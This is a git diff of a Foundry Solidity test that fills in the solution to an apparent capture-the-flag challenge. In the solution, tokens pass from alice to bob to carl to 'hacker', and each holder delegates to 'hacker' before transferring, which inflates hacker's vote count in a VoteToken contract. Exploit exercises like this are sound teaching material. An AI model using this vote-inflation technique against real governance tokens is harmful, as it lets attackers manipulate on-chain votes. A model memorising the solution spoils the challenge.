@@ -2,7 +2,7 @@
 pragma solidity ^0.8.12;
 
 import "forge-std/Test.sol";
-import "../src/VotingMachine.sol";
+import "../src/VoteToken.sol";
 
 contract exploitTest is Test {
     VoteToken vToken;
@@ -21,10 +21,24 @@ contract exploitTest is Test {
     }
 
     function testExploit() public {
+        // Solution
+
         vm.startPrank(alice);
+        vToken.delegate(hacker);
+        vToken.approve(bob, 1000);
+        vToken.transfer(bob, 1000);
+        vm.stopPrank();
 
-        // soluiton
+        vm.startPrank(bob);
+        vToken.delegate(hacker);
+        vToken.approve(carl, 1000);
+        vToken.transfer(carl, 1000);
+        vm.stopPrank();
 
+        vm.startPrank(carl);
+        vToken.delegate(hacker);
+        vToken.approve(hacker, 1000);
+        vToken.transfer(hacker, 1000);
         vm.stopPrank();
 
         uint hacker_vote = vToken.getVotes(hacker);
